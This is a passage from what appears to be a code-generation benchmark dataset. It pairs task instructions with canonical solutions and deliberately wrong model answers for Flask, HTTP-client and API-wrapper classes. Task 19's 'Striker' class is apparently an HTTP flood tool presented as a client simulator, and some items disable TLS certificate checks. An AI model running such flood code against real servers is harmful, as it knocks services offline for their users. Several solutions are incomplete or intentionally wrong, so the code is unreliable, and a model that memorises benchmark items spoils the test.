self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id):\n        todo = self.get(id)\n        self.todos.remove(todo)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request\nfrom flask_restx import Api, Resource, fields\nfrom functools import wraps\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 1\n        self.todos = []\n\n    def get(self, id: int) -> dict:\n        todo = next((item for item in self.todos if item['id'] == id), None)\n        if not todo:\n            raise ValueError(f\"Todo with ID {id} not found\")\n        return todo\n\n    def create(self, data: dict) -> dict:\n        data['id'] = self.counter\n        self.todos.append(data)\n        self.counter += 1\n        return data\n\n    def update(self, id: int, data: dict) -> dict:\n        todo = self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id: int) -> None:\n        self.todos[:] = [item for item in self.todos if item['id'] != id]\n\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.api = Api(self.app, version='1.0', title='Todo API',\n                       description='A simple Todo API')\n        self.ns = self.api.namespace('todos', description='Todo operations')\n\n        self.todo = self.api.model('Todo', {\n            'id': fields.Integer(readonly=True, description='The task unique identifier'),\n            'task': fields.String(required=True, description='The task details')\n        })\n\n        self.todo_dao = TodoDAO()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route('/')\n        class TodoList(Resource):\n            @self.ns.doc('list_todos')\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                '''List all todos'''\n                return self.todo_dao.todos\n\n            @self.ns.doc('create_todo')\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                '''Create a new todo'''\n                return self.todo_dao.create({'task': self.api.payload['task']}), 201\n\n        @self.ns.route('/<int:id>')\n        @self.ns.param('id', 'The todo identifier')\n        class TodoItem(Resource):\n            @self.ns.doc('get_todo')\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                '''Fetch a todo given its identifier'''\n                return self.todo_dao.get(id)\n\n            @self.ns.doc('update_todo')\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                '''Update a todo given its identifier'''\n                return self.todo_dao.update(id, {'task': self.api.payload['task']})\n\n            @self.ns.doc('delete_todo')\n            @self.ns.response(204, 'Todo deleted')\n            def delete(self, id):\n                '''Delete a todo given its identifier'''\n                self.todo_dao.delete(id)\n                return '', 204\n\n    def run(self):\n        self.app.run(debug=True)\n\n\nif __name__ == '__main__':\n    api = TodoAPI()\n    api.run()\n```"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Create a Python class that implements a streaming HTTP client capable of handling chunked transfer encoding, with support for both HTTP and HTTPS protocols, proxy configuration, and automatic reconnection logic.\n\nClass Description: The Stream class provides a robust HTTP client implementation for streaming data to a server using chunked transfer encoding. It handles connection management, automatic reconnection, proxy configuration, and SSL/TLS settings. The class is designed to maintain persistent connections and recover from network issues.\n\nAttributes:\n\nmaxtries: int - Maximum number of reconnection attempts\n_tries: int - Current number of reconnection attempts\n_delay: int - Current delay between reconnection attempts\n_closed: bool - Flag indicating if the connection is closed\n_server: str - Target server hostname\n_port: int - Target server port\n_headers: dict - HTTP headers to send with requests\n_url: str - Target URL path\n_ssl_enabled: bool - Flag for HTTPS connection\n_ssl_verification_enabled: bool - Flag for SSL certificate verification\n_conn: HTTPConnection/HTTPSConnection - The connection object\n_bytes: bytes - Buffer for received data\n\nMethods:\n\n__init__: (server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True) -> None - Initializes the Stream object with connection parameters\nwrite: (data, reconnect_on=(\"\", 200, 502)) -> None - Sends data to the server using chunked transfer encoding\nclose: () -> str/bytes - Closes the connection and returns the server's final response\n_connect: () -> None - Establishes a new connection to the server\n_getresponse: () -> HTTPResponse/bytes - Retrieves the server's response\n_isconnected: () -> bool - Checks if the connection is still active\n_reconnect: () -> None - Attempts to reestablish a lost connection\n_reset_retries: () -> None - Resets reconnection attempt counters\n_get_ssl_context: () -> ssl.SSLContext/None - Creates SSL context based on verification settings\n_get_proxy_config: () -> tuple - Retrieves proxy configuration from environment variables",
    "Canonical_solution": "import http.client\nimport ssl\nimport time\nfrom io import StringIO\nfrom urllib.parse import urlparse, unquote\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 5\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._connect()\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        if not self._isconnected():\n            response = self._getresponse()\n            if (response == \"\" and \"\" in reconnect_on) or (\n                response and isinstance(response, http.client.HTTPResponse) and response.status in reconnect_on\n            ):\n                self._reconnect()\n            elif response and isinstance(response, http.client.HTTPResponse):\n                raise Exception(\n                    \"Server responded with status code: {status_code}\\nand message: {msg}.\".format(\n                        status_code=response.status, msg=response.read()\n                    )\n                )\n            elif response == \"\":\n                raise Exception(\"Attempted to write but socket was not connected.\")\n\n        try:\n            msg = data\n            msglen = format(len(msg), \"x\")\n            self._conn.sock.setblocking(1)\n            self._conn.send(\n                \"{msglen}\\r\\n{msg}\\r\\n\".format(msglen=msglen, msg=msg).encode(\"utf-8\")\n            )\n            self._conn.sock.setblocking(0)\n        except http.client.socket.error:\n            self._reconnect()\n            self.write(data)\n\n    def _get_ssl_context(self):\n        context = None\n        if not self._ssl_verification_enabled:\n            context = ssl._create_unverified_context()\n        return context\n\n    def _connect(self):\n        server = self._server\n        port = self._port\n        headers = self._headers\n        ssl_enabled = self._ssl_enabled\n        proxy_server, proxy_port, proxy_auth = self._get_proxy_config()\n\n        if proxy_server and proxy_port:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(proxy_server, proxy_port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(proxy_server, proxy_port)\n\n            tunnel_headers = None\n            if proxy_auth:\n                tunnel_headers = {\"Proxy-Authorization\": proxy_auth}\n            self._conn.set_tunnel(server, port, headers=tunnel_headers)\n        else:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(server, port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(server, port)\n\n        self._conn.putrequest(\"POST\", self._url)\n        self._conn.putheader(\"Transfer-Encoding\", \"chunked\")\n        for header in headers:\n            self._conn.putheader(header, headers[header])\n        self._conn.endheaders()\n        self._conn.sock.setblocking(False)\n        self._bytes = b\"\"\n        self._reset_retries()\n        time.sleep(0.5)\n\n    def close(self):\n        self._reset_retries()\n        self._closed = True\n        try:\n            self._conn.send(\"\\r\\n0\\r\\n\\r\\n\".encode(\"utf-8\"))\n        except http.client.socket.error:\n            return \"\"\n        return self._getresponse()\n\n    def _getresponse(self):\n        self._conn.sock.setblocking(True)\n        response = self._bytes\n        while True:\n            try:\n                _bytes = self._conn.sock.recv(1)\n            except http.client.socket.error:\n                return b\"\"\n            if _bytes == b\"\":\n                break\n            else:\n                response += _bytes\n        self._conn.sock.setblocking(False)\n\n        if response != b\"\":\n            try:\n                response = http.client.HTTPResponse(_FakeSocket(response))\n                response.begin()\n            except:\n                response = b\"\"\n        return response\n\n    def _isconnected(self):\n        if self._closed:\n            return False\n        if self._conn.sock is None:\n            return False\n        try:\n            self._bytes = b\"\"\n            self._bytes = self._conn.sock.recv(1)\n            return False\n        except http.client.socket.error as e:\n            if e.errno == 35 or e.errno == 10035:\n                return True\n            elif e.errno == 54 or e.errno == 10054:\n                return False\n            elif e.errno == 11:\n                return True\n            elif isinstance(e, ssl.SSLError):\n                if e.errno == 2:\n                    return True\n                raise e\n            else:\n                raise e\n\n    def _reconnect(self):\n        if not self._isconnected():\n            try:\n                self._connect()\n            except http.client.socket.error as e:\n                if e.errno == 61 or e.errno == 10061:\n                    time.sleep(self._delay)\n                    self._delay += self._delay\n                    self._tries += 1\n                    if self._tries < self.maxtries:\n                        self._reconnect()\n                    else:\n                        self._reset_retries()\n                        raise e\n                else:\n                    raise e\n        self._closed = False\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_proxy_config(self):\n        proxy_server = None\n        proxy_port = None\n        proxy_username = None\n        proxy_password = None\n        proxy_auth = None\n        ssl_enabled = self._ssl_enabled\n\n        if ssl_enabled:\n            proxy = os.environ.get(\"https_proxy\") or os.environ.get(\"HTTPS_PROXY\")\n        else:\n            proxy = os.environ.get(\"http_proxy\") or os.environ.get(\"HTTP_PROXY\")\n\n        no_proxy = os.environ.get(\"no_proxy\") or os.environ.get(\"NO_PROXY\")\n        no_proxy_url = no_proxy and self._server in no_proxy\n\n        if proxy and not no_proxy_url:\n            p = urlparse(proxy)\n            proxy_server = p.hostname\n            proxy_port = p.port\n            proxy_username = p.username\n            proxy_password = p.password\n\n        if proxy_username and proxy_password:\n            username = unquote(proxy_username)\n            password = unquote(proxy_password)\n            proxy_auth = utils.basic_auth(username, password)\n\n        return proxy_server, proxy_port, proxy_auth\n\nclass _FakeSocket(StringIO):\n    def makefile(self, *args, **kwargs):\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport ssl\nimport os\nimport time\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 5\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._conn = None\n        self._bytes = b\"\"\n        self._connect()\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        if not self._isconnected():\n            self._reconnect()\n        try:\n            if isinstance(data, str):\n                data = data.encode(\"utf-8\")\n            self._conn.request(\"POST\", self._url, body=data, headers=self._headers)\n            response = self._getresponse()\n            status = response.status\n            if status in reconnect_on:\n                self._reconnect()\n        except (ConnectionError, http.client.BadStatusLine, http.client.ResponseNotReady) as e:\n            self._reconnect()\n\n    def close(self):\n        if self._conn:\n            try:\n                response = self._getresponse()\n                self._conn.close()\n                self._closed = True\n                return response.read() if hasattr(response, \"read\") else response\n            except Exception:\n                self._conn.close()\n                self._closed = True\n                return b\"\"\n\n    def _connect(self):\n        proxy_config = self._get_proxy_config()\n        if proxy_config:\n            host, port, target_host, target_port = proxy_config\n            self._server = host\n            self._port = port\n            self._headers[\"Host\"] = f\"{target_host}:{target_port}\"\n        else:\n            self._headers[\"Host\"] = f\"{self._server}:{self._port}\"\n        if self._ssl_enabled:\n            context = self._get_ssl_context()\n            self._conn = http.client.HTTPSConnection(self._server, self._port, context=context)\n        else:\n            self._conn = http.client.HTTPConnection(self._server, self._port)\n        self._reset_retries()\n\n    def _getresponse(self):\n        try:\n            return self._conn.getresponse()\n        except (ConnectionError, http.client.BadStatusLine, http.client.IncompleteRead) as e:\n            self._reconnect()\n            return self._conn.getresponse()\n\n    def _isconnected(self):\n        if not self._conn:\n            return False\n        try:\n            self._conn.sock\n            return True\n        except Exception:\n            return False\n\n    def _reconnect(self):\n        self._tries += 1\n        if self._tries > self.maxtries:\n            raise ConnectionError(\"Max reconnection attempts exceeded\")\n        self._conn.close()\n        time.sleep(self._delay)\n        self._connect()\n        self._delay *= 2\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_ssl_context(self):\n        context = ssl.create_default_context(cafile=ssl.CERT_NONE if not self._ssl_verification_enabled else None)\n        if not self._ssl_verification_enabled:\n            context.check_hostname = False\n            context.verify_mode = ssl.CERT_NONE\n        return context\n\n    def _get_proxy_config(self):\n        http_proxy = os.environ.get(\"HTTP_PROXY\") or os.environ.get(\"http_proxy\")\n        https_proxy = os.environ.get(\"HTTPS_PROXY\") or os.environ.get(\"https_proxy\")\n        if self._ssl_enabled and https_proxy:\n            parts = https_proxy.split(\"://\")[-1].split(\":\")\n            host, port = parts[0], int(parts[1])\n            return host, port, self._server, self._port\n        elif not self._ssl_enabled and http_proxy:\n            parts = http_proxy.split(\"://\")[-1].split(\":\")\n            host, port = parts[0], int(parts[1])\n            return host, port, self._server, self._port\n        return None\n```"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Create a Python class that simulates multiple HTTP clients making concurrent requests to a target server, tracking successful and failed requests, with support for both HTTP and HTTPS protocols.\n\nClass Description: Striker is a Process subclass designed to simulate multiple concurrent HTTP clients. It creates and manages multiple socket connections to a target server, sends randomized HTTP requests, tracks request counts, and handles connection cleanup.\n\nAttributes:\n- counter: [list] - Shared counter for tracking successful and failed requests (index 0 for success, 1 for failures)\n- nr_socks: [int] - Number of concurrent socket connections to maintain\n- runnable: [bool] - Control flag for the main execution loop\n- socks: [list] - List of active socket connections\n- ssl: [bool] - Flag indicating whether to use HTTPS\n- host: [str] - Target server hostname\n- url: [str] - Base URL path for requests\n- port: [int] - Target server port number\n- referers: [list] - List of referer URLs for request randomization\n\nMethods:\n- __init__(url, nr_sockets, counter) -> [None] - Initializes the Striker with target URL, connection count, and shared counter\n- run() -> [None] - Main execution loop that creates connections, sends requests, and processes responses\n- closeConnections() -> [None] - Closes all active socket connections\n- createPayload() -> [tuple] - Generates randomized request payload (URL and headers)\n- generateData() -> [tuple] - Creates request URL with random query string and headers\n- stop() -> [None] - Stops the execution loop and cleans up resources\n- incCounter() -> [None] - Increments the success counter\n- incFailed() -> [None] - Increments the failure counter",
    "Canonical_solution": "from multiprocessing import Process, Manager\nimport urlparse\nimport random\nimport sys\n\nif sys.version_info < (3,0):\n    import httplib\n    HTTPCLIENT = httplib\nelse:\n    import http.client\n    HTTPCLIENT = http.client\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super(Striker, self).__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        \n        parsedUrl = urlparse.urlparse(url)\n        self.ssl = parsedUrl.scheme == 'https'\n        self.host = parsedUrl.netloc.split(':')[0]\n        self.url = parsedUrl.path\n        self.port = parsedUrl.port or (443 if self.ssl else 80)\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://' + self.host + '/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            try:\n                for i in range(self.nr_socks):\n                    if self.ssl:\n                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)\n                    else:\n                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)\n                    self.socks.append(c)\n\n                for conn_req in self.socks:\n                    (url, headers) = self.createPayload()\n                    conn_req.request('GET', url, None, headers)\n\n                for conn_resp in self.socks:\n                    resp = conn_resp.getresponse()\n                    self.incCounter()\n\n                self.closeConnections()\n            except:\n                self.incFailed()\n\n    def closeConnections(self):\n        for conn in self.socks:\n            try:\n                conn.close()\n            except:\n                pass\n\n    def createPayload(self):\n        req_url, headers = self.generateData()\n        random_keys = headers.keys()\n        random.shuffle(random_keys)\n        random_headers = {}\n        for header_name in random_keys:\n            random_headers[header_name] = headers[header_name]\n        return (req_url, random_headers)\n\n    def generateData(self):\n        param_joiner = \"&\" if self.url.count(\"?\") > 0 else \"?\"\n        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))\n        http_headers = self.generateRandomHeaders()\n        return (request_url, http_headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n        self.terminate()\n\n    def incCounter(self):\n        try:\n            self.counter[0] += 1\n        except:\n            pass\n\n    def incFailed(self):\n        try:\n            self.counter[1] += 1\n        except:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nimport random\nimport ssl\nfrom multiprocessing import Process\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super().__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        self.ssl = url.startswith('https')\n        self.host = url.split('/')[2]\n        self.url = '/'.join(url.split('/')[3:])\n        self.port = 443 if self.ssl else 80\n        self.referers = [\n            \"http://www.google.com\",\n            \"http://www.bing.com\",\n            \"http://www.yahoo.com\"\n        ]\n\n    def run(self):\n        while self.runnable:\n            for i in range(self.nr_socks):\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.settimeout(5)\n                if self.ssl:\n                    context = ssl._create_unverified_context()\n                    sock = context.wrap_socket(sock, server_hostname=self.host)\n                try:\n                    sock.connect((self.host, self.port))\n                    self.socks.append(sock)\n                    self.sendRequest(sock)\n                except Exception as e:\n                    self.incFailed()\n                    sock.close()\n            for sock in self.socks:\n                try:\n                    data = sock.recv(1024)\n                    if not data:\n                        self.incCounter()\n                        sock.close()\n                except Exception:\n                    self.incFailed()\n                    sock.close()\n            self.socks.clear()\n\n    def closeConnections(self):\n        for sock in self.socks:\n            sock.close()\n        self.socks.clear()\n\n    def createPayload(self):\n        return self.generateData()\n\n    def generateData(self):\n        path = self.url + \"?id=\" + str(random.randint(1000, 9999))\n        referer = random.choice(self.referers)\n        headers = f\"GET {path} HTTP/1.1\\r\\nHost: {self.host}\\r\\nReferer: {referer}\\r\\nConnection: Keep-Alive\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"\n        return (path, headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n\n    def incCounter(self):\n        self.counter[0] += 1\n\n    def incFailed(self):\n        self.counter[1] += 1\n```"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a WhatsApp client class that interacts with the WhatsApp Business API to send text messages to users.\n\nClass Description: The WhatsAppClient class encapsulates functionality for sending text messages through the WhatsApp Business API. It handles authentication, API endpoint construction, and message payload preparation.\n\nAttributes:\nAPI_URL: str - Base URL for the WhatsApp Business API (default: \"https://graph.facebook.com/v17.0/\")\nWHATSAPP_API_TOKEN: str - Temporary access token for authenticating with the WhatsApp API\nWHATSAPP_CLOUD_NUMBER_ID: str - Phone number ID associated with the WhatsApp Business account\nheaders: dict - HTTP headers containing authorization and content type information\n\nMethods:\n__init__: () -> None - Initializes the WhatsAppClient instance by setting up authorization headers and constructing the base API URL\nsend_text_message: (message: str, phone_number: str) -> int - Sends a text message to the specified phone number via WhatsApp API and returns the HTTP status code",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nimport os\nimport requests\nimport json\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    WHATSAPP_API_TOKEN = \"<Temporary access token from your WhatsApp API Setup>\"\n    WHATSAPP_CLOUD_NUMBER_ID = \"<Phone number ID from your WhatsApp API Setup>\"\n\n    def __init__(self):\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        self.API_URL = self.API_URL + self.WHATSAPP_CLOUD_NUMBER_ID\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": 'whatsapp',\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"preview_url\": False,\n                \"body\": message\n            }\n        }\n        response = requests.post(f\"{self.API_URL}/messages\", json=payload, headers=self.headers)\n        print(response.status_code)\n        assert response.status_code == 200, \"Error sending message\"\n        return response.status_code\n\napp = Flask(__name__)\n\n@app.route('/msgrcvd', methods=['POST', 'GET'])\ndef msgrcvd():\n    message = request.args.get('message')\n    answer = llm(message)\n    print(message)\n    print(answer)\n    client.send_text_message(llm(message), \"<your phone number>\")\n    return message + \"<p/>\" + answer",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nimport requests\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n\n    def __init__(self, WHATSAPP_API_TOKEN, WHATSAPP_CLOUD_NUMBER_ID):\n        self.WHATSAPP_API_TOKEN = WHATSAPP_API_TOKEN\n        self.WHATSAPP_CLOUD_NUMBER_ID = WHATSAPP_CLOUD_NUMBER_ID\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\"\n        }\n\n    def send_text_message(self, message, phone_number):\n        url = f\"{self.API_URL}{self.WHATSAPP_CLOUD_NUMBER_ID}/messages\"\n        payload = {\n            \"messaging_product\": \"whatsapp\",\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\"body\": message}\n        }\n        response = requests.post(url, json=payload, headers=self.headers)\n        return response.status_code\n```"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Flask-based HTTP server that simulates a RocketMap API endpoint server, capable of generating and returning mock data for gyms and pok\u00e9stops based on geographic coordinates and radius.\n\nFunction Description: The server provides three main endpoints:\n1. Root endpoint ('/') - Returns a simple welcome message\n2. Login endpoint ('/login/<lat>/<lng>/<r>') - Generates and returns gym and pok\u00e9stop data within a specified radius of given coordinates\n3. Scan endpoint ('/scan/<lat>/<lng>') - Returns mock scan data including nearby forts and wild pok\u00e9mons for given coordinates\n\nInput:\n- For root endpoint: None\n- For login endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n  - r: [string] - Radius in meters as string\n- For scan endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n\nOutput:\n- For root endpoint: [string] - Welcome message\n- For login endpoint: [JSON] - List of generated gyms and pok\u00e9stops with their properties\n- For scan endpoint: [JSON] - Mock scan data including cells with forts and wild pok\u00e9mons",
    "Canonical_solution": "from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/')\ndef api_root():\n    return 'This here be a Fake RocketMap API Endpoint Server'\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef api_login(lat, lng, r):\n    global forts\n\n    if len(forts):\n        # already generated\n        return jsonify(forts)\n\n    # coerce types\n    r = int(r)  # radius in meters\n    lat = float(lat)\n    lng = float(lng)\n\n    forts = []\n    area = 3.14 * (r * r)\n\n    # One gym every N sq.m\n    gymCount = int(math.ceil(area / 25000))\n\n    # One pks every N sq.m\n    pksCount = int(math.ceil(area / 15000))\n\n    # Gyms\n    for i in range(gymCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'guard_pokemon_id': randint(1, 140),\n            'gym_points': randint(1, 30000),\n            'id': 'gym-{}'.format(i),\n            'is_in_battle': not getrandbits(1),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'owned_by_team': randint(0, 3)\n        })\n\n    # Pokestops\n    for i in range(pksCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'id': 'pks-{}'.format(i),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'type': 1\n        })\n\n    log.info('Login for location %f,%f generated %d gyms, %d pokestop', lat,\n             lng, gymCount, pksCount)\n    return jsonify(forts)\n\n@app.route('/scan/<lat>/<lng>')\ndef api_scan(lat, lng):\n    location = (float(lat), float(lng))\n    cells = []\n    # for i in range(randint(60,70)):\n    for i in range(3):\n        cells.append({\n            'current_timestamp_ms': int(time() * 1000),\n            'forts': getForts(location),\n            's2_cell_id': uuid4(),  # wrong, but also unused so it\n                                    # doesn't matter\n            'wild_pokemons': makeWildPokemon(location),\n            'catchable_pokemons': [],  # unused\n            'nearby_pokemons': []  # unused\n        })\n    return jsonify({'responses': {'GET_MAP_OBJECTS': {'map_cells': cells}}})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, jsonify\n\napp = Flask(__name__)\n\n@app.route('/')\ndef root():\n    return \"Welcome to the RocketMap API Endpoint Server!\"\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef login(lat, lng, r):\n    data = {\n        \"gyms\": [\n            {\n                \"id\": \"gym1\",\n                \"team\": 1,\n                \"latitude\": float(lat) + 0.0001,\n                \"longitude\": float(lng) + 0.0001,\n                \"name\": \"Gym One\"\n            },\n            {\n                \"id\": \"gym2\",\n                \"team\": 2,\n                \"latitude\": float(lat) - 0.0001,\n                \"longitude\": float(lng) - 0.0001,\n                \"name\": \"Gym Two\"\n            }\n        ],\n        \"pokemons\": [],\n        \"pokestops\": [\n            {\n                \"id\": \"stop1\",\n                \"latitude\": float(lat) + 0.0002,\n                \"longitude\": float(lng) + 0.0002,\n                \"enabled\": True,\n                \"last_modified\": 1634567890,\n                \"lure_expiration\": None,\n                \"name\": \"Poke Stop A\"\n            },\n            {\n                \"id\": \"stop2\",\n                \"latitude\": float(lat) - 0.0002,\n                \"longitude\": float(lng) - 0.0002,\n                \"enabled\": True,\n                \"last_modified\": 1634567891,\n                \"lure_expiration\": 1634567990,\n                \"name\": \"Poke Stop B\"\n            }\n        ]\n    }\n    return jsonify(data)\n\n@app.route('/scan/<lat>/<lng>')\ndef scan(lat, lng):\n    data = {\n        \"cells\": [\n            {\n                \"forts\": [\n                    {\n                        \"type\": \"gym\",\n                        \"latitude\": float(lat) + 0.0001,\n                        \"longitude\": float(lng) + 0.0001,\n                        \"name\": \"Nearby Gym\",\n                        \"team\": 1\n                    },\n                    {\n                        \"type\": \"pokestop\",\n                        \"latitude\": float(lat) - 0.0001,\n                        \"longitude\": float(lng) - 0.0001,\n                        \"name\": \"Nearby Pokestop\",\n                        \"lure\": False\n                    }\n                ],\n                \"wild_pokemons\": []\n            }\n        ]\n    }\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Flask-based HTTP server to visualize and navigate through a robot dataset, allowing users to view different episodes and associated metadata.\n\nFunction Description: The `run_server` function initializes and runs a Flask web server that provides a user interface for exploring robot datasets. It handles dataset navigation, episode selection, and displays relevant information including videos and task descriptions. The server supports both local datasets and remote datasets hosted on Hugging Face.\n\nInput:\n- dataset: Union[LeRobotDataset, IterableNamespace, None] - The dataset to visualize (can be None if loading from URL)\n- episodes: Optional[List[int]] - List of episode IDs to make available (None for all episodes)\n- host: str - Host address to run the server on\n- port: str - Port number to run the server on\n- static_folder: Path - Path to static files directory\n- template_folder: Path - Path to HTML templates directory\n\nOutput: None (runs a Flask server indefinitely until interrupted)\n\nMethods (route handlers):\n1. homepage() -> Union[Redirect, Response] - Handles root URL, redirects to first episode or shows dataset selection page\n2. show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect - Redirects to the first episode of a specified dataset\n3. show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]] - Displays detailed information for a specific episode including videos and task data\n\nThe server provides the following features:\n- Dataset version validation\n- Episode navigation\n- Video playback\n- Task description display\n- Data visualization\n- Support for both local and remote datasets\n- Featured datasets showcase",
    "Canonical_solution": "import argparse\nimport json\nimport logging\nimport re\nimport shutil\nimport tempfile\nfrom pathlib import Path\n\nimport requests\nfrom flask import Flask, redirect, render_template, request, url_for\n\ndef run_server(\n    dataset: LeRobotDataset | IterableNamespace | None,\n    episodes: list[int] | None,\n    host: str,\n    port: str,\n    static_folder: Path,\n    template_folder: Path,\n):\n    app = Flask(__name__, static_folder=static_folder.resolve(), template_folder=template_folder.resolve())\n    app.config[\"SEND_FILE_MAX_AGE_DEFAULT\"] = 0  # specifying not to cache\n\n    @app.route(\"/\")\n    def hommepage(dataset=dataset):\n        if dataset:\n            dataset_namespace, dataset_name = dataset.repo_id.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=0,\n                )\n            )\n\n        dataset_param, episode_param = None, None\n        all_params = request.args\n        if \"dataset\" in all_params:\n            dataset_param = all_params[\"dataset\"]\n        if \"episode\" in all_params:\n            episode_param = int(all_params[\"episode\"])\n\n        if dataset_param:\n            dataset_namespace, dataset_name = dataset_param.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=episode_param if episode_param is not None else 0,\n                )\n            )\n\n        featured_datasets = [\n            \"lerobot/aloha_static_cups_open\",\n            \"lerobot/columbia_cairlab_pusht_real\",\n            \"lerobot/taco_play\",\n        ]\n        return render_template(\n            \"visualize_dataset_homepage.html\",\n            featured_datasets=featured_datasets,\n            lerobot_datasets=available_datasets,\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>\")\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode_id = 0\n        return redirect(\n            url_for(\n                \"show_episode\",\n                dataset_namespace=dataset_namespace,\n                dataset_name=dataset_name,\n                episode_id=first_episode_id,\n            )\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>/episode_<int:episode_id>\")\n    def show_episode(dataset_namespace, dataset_name, episode_id, dataset=dataset, episodes=episodes):\n        repo_id = f\"{dataset_namespace}/{dataset_name}\"\n        try:\n            if dataset is None:\n                dataset = get_dataset_info(repo_id)\n        except FileNotFoundError:\n            return (\n                \"Make sure to convert your LeRobotDataset to v2 & above. See how to convert your dataset at https://github.com/huggingface/lerobot/pull/461\",\n                400,\n            )\n        dataset_version = (\n            dataset.meta._version if isinstance(dataset, LeRobotDataset) else dataset.codebase_version\n        )\n        match = re.search(r\"v(\\d+)\\.\", dataset_version)\n        if match:\n            major_version = int(match.group(1))\n            if major_version < 2:\n                return \"Make sure to convert your LeRobotDataset to v2 & above.\"\n\n        episode_data_csv_str, columns = get_episode_data(dataset, episode_id)\n      